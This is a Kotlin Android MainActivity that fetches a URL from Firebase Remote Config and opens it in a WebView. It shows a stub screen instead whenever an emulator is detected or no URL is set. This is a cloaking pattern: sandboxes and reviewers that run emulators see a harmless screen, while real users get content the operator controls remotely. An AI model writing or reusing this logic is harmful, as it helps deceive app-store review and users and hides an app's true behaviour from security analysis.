package com.passinality.app

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.passinality.app.databinding.ActivityMainBinding
import com.passinality.app.utils.CheckIsEmu
import com.passinality.app.utils.Constants.Companion.KEY_URL
import com.passinality.app.utils.Constants.Companion.LINK_FIREBASE
import com.passinality.app.utils.SharedPreferences

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding

    private lateinit var remoteConfig: FirebaseRemoteConfig

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        logicApp()
    }

    private fun logicApp() {
        val sharedPreferences = SharedPreferences(this)

        if (sharedPreferences.contains(LINK_FIREBASE)) {
            openLinkInWebView()
        } else {
            initFirebase()
            connectFirebase()
        }
    }

    private fun initFirebase() {
        remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
    }

    private fun connectFirebase() {
        try {
            remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val url = remoteConfig.getString(KEY_URL)
                    if (url.isEmpty() || CheckIsEmu().checkIsEmu()) {
                        showStubScreen()
                    } else {
                        val sharedPreferences = SharedPreferences(this)
                        sharedPreferences.save(LINK_FIREBASE, url)

                        openLinkInWebView()
                    }
                } else {
                    showStubScreen()
                }
            }
        } catch (e: Exception) {
            showStubScreen()
        }
    }

    private fun showStubScreen() {
        val intent = Intent(this, StubScreen::class.java)
        startActivity(intent)
    }

    private fun openLinkInWebView() {
        val intent = Intent(this, WV::class.java)
        startActivity(intent)
    }

}